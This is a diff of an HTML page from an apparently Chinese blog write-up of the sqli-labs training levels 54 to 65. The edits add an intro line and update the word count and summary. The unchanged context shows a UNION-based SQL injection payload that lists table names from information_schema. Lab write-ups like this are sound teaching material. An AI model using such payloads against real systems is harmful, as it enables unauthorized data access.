@@ -5,10 +5,13 @@
 <head>
     <meta charset="utf-8">
     <meta name="keywords" content="sqli靶场(54~65关), 网络安全，计算机，渗透">
-    <meta name="description" content="Less-54本关是字符型注入，但是只能尝试十次，这里的表名和密码等是每十次尝试后就强制进行更换。已知数据库名字叫做 challenges。
+    <meta name="description" content="最后一个部分啦~
+
+
+Less-54本关是字符型注入，但是只能尝试十次，这里的表名和密码等是每十次尝试后就强制进行更换。已知数据库名字叫做 challenges。
 54.1获取表名payloay：
 
-id=-1&#39; union select 1,2,(select">
+id=-1&#39; union select ">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -367,7 +370,7 @@ id=-1&#39; union select 1,2,(select">
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    910
+                    917
                 </div>
                 
 
@@ -389,7 +392,10 @@ id=-1&#39; union select 1,2,(select">
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="Less-54"><a href="#Less-54" class="headerlink" title="Less-54"></a>Less-54</h1><p>本关是字符型注入，但是只能尝试十次，这里的表名和密码等是每十次尝试后就强制进行更换。已知数据库名字叫做 challenges。</p>
+                <p>最后一个部分啦~</p>
+<span id="more"></span>
+
+<h1 id="Less-54"><a href="#Less-54" class="headerlink" title="Less-54"></a>Less-54</h1><p>本关是字符型注入，但是只能尝试十次，这里的表名和密码等是每十次尝试后就强制进行更换。已知数据库名字叫做 challenges。</p>
 <h3 id="54-1获取表名"><a href="#54-1获取表名" class="headerlink" title="54.1获取表名"></a>54.1获取表名</h3><pre class="line-numbers language-bash"><code class="language-bash">payloay：
 
 id<span class="token operator">=</span>-1' union <span class="token keyword">select</span> 1,2,<span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> from information_schema.tables where table_schema<span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">))</span>--+
@@ -769,7 +775,7 @@ id<span class="token operator">=</span>1"<span class="token punctuation">)</span
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            
+                            最后一个部分啦~
                         
                     </div>
                     <div class="publish-info">
